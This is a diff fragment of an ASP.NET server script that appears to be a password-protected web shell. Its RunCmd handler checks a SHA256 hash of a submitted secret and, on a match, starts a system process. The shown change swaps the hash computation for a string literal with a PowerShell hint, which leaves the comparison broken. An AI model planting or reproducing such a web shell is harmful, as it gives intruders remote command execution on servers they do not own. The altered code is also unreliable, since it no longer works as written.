@@ -5,7 +5,7 @@
 <script runat="server">      
 
 Sub RunCmd(Src As Object, E As EventArgs)
-  Dim hash = New System.Security.Cryptography.SHA256Managed().ComputeHash(System.Text.Encoding.UTF8.GetBytes("<secret>"))
+  Dim hash = "from powershell: [System.Security.Cryptography.SHA256Managed]::new().ComputeHash([System.Text.UTF8Encoding]::new().GetBytes("<secret>"))"
   Dim secHash = New System.Security.Cryptography.SHA256Managed().ComputeHash(System.Text.Encoding.UTF8.GetBytes(xsec.text))
   If hash.SequenceEqual(secHash) Then
     Dim myProcess As New Process()            
